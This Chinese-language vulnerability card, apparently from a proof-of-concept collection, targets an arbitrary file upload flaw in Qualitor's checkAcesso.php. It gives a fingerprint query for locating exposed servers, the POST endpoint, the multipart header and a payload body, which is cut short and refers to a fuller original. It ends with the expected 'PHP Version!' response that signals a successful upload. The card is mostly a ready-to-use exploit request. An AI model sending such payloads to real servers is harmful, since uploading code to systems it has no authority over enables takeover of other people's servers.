# Qualitor-checkAcesso任意文件上传漏洞

- **系统**：Qualitor　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Qualitor-Web"`
- **请求**：`POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------QUA…`

**请求体 / payload**
```
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="idtipo"
2
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmfilestorage"
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmdiretoriorede"
.
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmbucket"
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmaccesskey"
------------------…（脚本共 1133 字，完整版见原文）
```
- **预期**：200　|　PHP Version!